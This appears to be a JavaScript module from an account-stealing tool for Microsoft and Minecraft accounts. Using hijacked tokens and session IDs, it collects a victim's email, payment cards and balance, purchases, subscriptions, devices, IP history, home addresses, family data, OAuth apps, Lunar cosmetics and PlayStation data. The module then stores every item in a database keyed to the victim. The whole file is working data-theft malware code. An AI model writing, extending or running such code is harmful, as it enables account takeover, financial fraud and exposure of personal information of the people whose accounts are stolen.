const { updateExtraInformation } = require("../process/helpers");
const getogo = require("../secure/getogo");
const getpoints = require("../secure/getpoints");
const getDevices = require("../devices/getDevices");
const getsubscriptions = require("../secure/getsubscriptions");
const getpurchases = require("../secure/getpurchases");
const getcards = require("../secure/getcards");
const getoauths = require("../secure/getoauths");
const getips = require("../secure/getips");
const getAddresses = require("../info/getAddresses");
const getStats = require("../hypixelapi/getStats");
const getAliases = require("../secure/getAliases");
const checkmc = require("../../../db/checkmc");
const { getlunar } = require("../lunarapi/src/index");
const {
  getCosmeticNameById,
  getEmoteNameById
} = require("../../../store/assetsloader");
const { playstationauth } = require("../secure/playstationauth");
const getfamilydata = require("../secure/getfamilydata");

function filterKnownWithId(items, getName) {
  return items
    .map(item => {
      const id = typeof item === "object" ? item.cosmeticId || item.id || null : item;
      if (!id) return null;
      const name = getName(id);
      if (!name) return null;
      return name;
    })
    .filter(Boolean);
}

async function getinfo(hasamc, oldname, axios, msatoken, uid, mc, ssid, playxbl, mpurchase) {
  const info = {
    family: null,
    stats: null,
    email: null,
    aliases: null,
    canary: null,
    cosmetics: {
      allcosmetics: null,
      equippedcosmetics: null,
      lunarrank: null,
      lunarfreecosmetics: null
    },
    emotes: {
      allemotes: null,
      equippedemotes: null
    }
  };

  console.log(`Getting data for user ${uid}!`);

  let ogo = null;
  let points = null;
  let family = null;
  let devices = null;
  let subs = null;
  let purchases = null;
  let cards = null;
  let oauths = null;
  let ips = null;
  let addresses = null;
  let stats = null;
  let aliases = null;
  let canary2 = null;
  let primary = null;

  const promises = [];

  if (oldname) {
    promises.push(
      (async () => {
        try {
          stats = await getStats(oldname);
        } catch (e) {
          console.error(`Error getting stats for user ${uid}:`, e);
        }
      })()
    );
  }

if (oldname && checkmc(mc)) {
  promises.push(
    (async () => {
      try {
        const d = await getlunar(ssid);
        const [cosmeticRaw, emoteRaw] = JSON.parse(d);
        const now = new Date();
        const cos = JSON.stringify(cosmeticRaw);
        console.log(`cosmetics: ${cos}`);

        const allcosmeticsArray = filterKnownWithId(
          cosmeticRaw.ownedCosmetics.filter(c => !c.expiresAt || new Date(c.expiresAt) > now),
          getCosmeticNameById
        );

        const equippedcosmeticsArray = filterKnownWithId(
          cosmeticRaw.settings?.equippedCosmetics || [],
          getCosmeticNameById
        );

        const lunarfreecosmeticsArray = filterKnownWithId(
          cosmeticRaw.lunarPlusFreeCosmeticIds || [],
          getCosmeticNameById
        );

        const allemotesArray = filterKnownWithId(
          emoteRaw.ownedEmoteIds || [],
          getEmoteNameById
        );

        const equippedemotesArray = filterKnownWithId(
          emoteRaw.equippedEmoteIds || [],
          getEmoteNameById
        );

        info.cosmetics.allcosmetics = allcosmeticsArray.length ? allcosmeticsArray.join(", ") : "None";
        info.cosmetics.equippedcosmetics = equippedcosmeticsArray.length ? equippedcosmeticsArray.join(", ") : "None";
        info.cosmetics.lunarrank = cosmeticRaw.rankName || "None";
        info.cosmetics.lunarfreecosmetics = lunarfreecosmeticsArray.length ? lunarfreecosmeticsArray.join(", ") : "None";
        info.emotes.allemotes = allemotesArray.length ? allemotesArray.join(", ") : "None";
        info.emotes.equippedemotes = equippedemotesArray.length ? equippedemotesArray.join(", ") : "None";

        // Count owned cosmetics only
        let ownedCosmetics = cosmeticRaw.ownedCosmetics || [];
        const validCosmeticCount = ownedCosmetics.reduce((count, c) => {
          return getCosmeticNameById(c.cosmeticId) ? count + 1 : count;
        }, 0);

        // Count owned emotes only
        let ownedEmotes = emoteRaw.ownedEmoteIds || [];
        const validEmoteCount = ownedEmotes.reduce((count, id) => {
          return getEmoteNameById(id) ? count + 1 : count;
        }, 0);

        info.cosmetics.cosmeticamount = validCosmeticCount;
        info.emotes.emotesamount = validEmoteCount;

      } catch (e) {
        console.error(`Error getting Lunar data for user ${uid}:`, e);
      }
    })()
  );
}


if (playxbl && mpurchase) {
  promises.push(
    (async () => {
      const result = await playstationauth(playxbl, mpurchase);
      await updateExtraInformation(uid, "playstation", result.playstation);
      await updateExtraInformation(uid, "minecoin", result.minecoin);
    })() 
  );
}



  if (hasamc) {
    promises.push(
      (async () => {
        try {
          ogo = await getogo(axios);

          if (!ogo) console.log("Failed to fetch profile info");
          const parsed = JSON.parse(ogo);
          info.email = parsed.email;
        } catch (e) {
          console.error(`getogo error for ${uid}:`, e);
        }
      })(),
      (async () => {
        try {
          points = await getpoints(axios);
        } catch (e) {
          console.error(`getpoints error for ${uid}:`, e);
        }
      })(),
      (async () => {
        try {

          // Updated family data
          family = await getfamilydata(axios);
        } catch (e) {
          console.error(`getFamily error for ${uid}:`, e);
        }
      })(),
      (async () => {
        try {
          devices = await getDevices(axios);
        } catch (e) {
          console.error(`getDevices error for ${uid}:`, e);
        }
      })(),
      (async () => {
        try {
          subs = await getsubscriptions(axios);
        } catch (e) {
          console.error(`getsubscriptions error for ${uid}:`, e);
        }
      })(),
      (async () => {
        try {
          purchases = await getpurchases(axios, msatoken);
        } catch (e) {
          console.error(`getpurchases error for ${uid}:`, e);
        }
      })(),
      (async () => {
        try {
          cards = await getcards(msatoken, axios);
        } catch (e) {
          console.error(`getcards error for ${uid}:`, e);
        }
      })(),
      (async () => {
        try {
          oauths = await getoauths(axios);
        } catch (e) {
          console.error(`getoauths error for ${uid}:`, e);
        }
      })(),
      (async () => {
        try {
          ips = await getips(axios);
        } catch (e) {
          console.error(`getips error for ${uid}:`, e);
        }
      })(),
      (async () => {
        try {
          addresses = await getAddresses(axios);
        } catch (e) {
          console.error(`getAddresses error for ${uid}:`, e);
        }
      })()
    );
  }

  try {
    await Promise.all(promises);
const carddata = cards?.data ? JSON.parse(cards.data) : []; 
const totalBalance = cards?.totalBalance || 0;

    await Promise.all([
      updateExtraInformation(uid, "ogo", ogo || null),
      updateExtraInformation(uid, "mspoints", points || null),
      updateExtraInformation(uid, "family", family),
      updateExtraInformation(uid, "devices", JSON.stringify(devices || [])),
      updateExtraInformation(uid, "subscriptions", JSON.stringify(subs || [])),
      updateExtraInformation(uid, "purchases", JSON.stringify(purchases || [])),
      updateExtraInformation(uid, "cards", JSON.stringify(carddata)), 
      updateExtraInformation(uid, "msbalance", JSON.stringify(totalBalance)),
      updateExtraInformation(uid, "oauthsbefore", JSON.stringify(oauths || [])),
      updateExtraInformation(uid, "ip", JSON.stringify(ips || [])),
      updateExtraInformation(uid, "addresses", JSON.stringify(addresses || []))
    ]);

  //  console.log(`Successfully updated data for user ${uid}`);

    info.family = family || null;
    info.stats = stats || null;
    info.canary = canary2 || null;
    info.email = primary || null;
    return info;
  } catch (error) {
    console.error(`Error in getinfo for user ${uid}:`, error);
    info.family = family || null;
    info.stats = stats || null;
    info.canary = canary2 || null;
    info.email = primary || null;
    return info;
  }
}

module.exports = {
  getinfo
};
